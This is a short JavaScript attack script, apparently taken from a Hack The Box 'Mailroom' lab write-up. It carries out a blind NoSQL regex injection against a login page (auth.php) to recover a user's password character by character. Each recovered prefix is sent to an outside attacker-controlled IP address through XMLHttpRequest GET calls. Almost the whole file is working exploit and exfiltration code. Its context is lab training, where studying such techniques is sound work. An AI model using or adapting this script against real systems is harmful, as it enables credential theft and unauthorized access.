//
//

var password = "";
var characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#%:;<>@_=';

for (var i = 0; i < characters.length; i++) {

    var req = new XMLHttpRequest();
    req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req.send("email=tristan@mailroom.htb&password[$regex]=" + password + characters[i] + ".*");

    if (req.responseText.length == 130) {
        password += characters[i];
        var exfil_req = new XMLHttpRequest();
        exfil_req.open("GET", "http://10.10.14.237:443/?pass=" + password, true);
        exfil_req.send();
        i = 0;
    }
}

var done_req = new XMLHttpRequest();
done_req.open("GET", "http://10.10.14.237:443/?done=" + password, true);
done_req.send();

//
//
// https://0xdf.gitlab.io/2023/08/19/htb-mailroom.html#shell-as-tristan
//
//
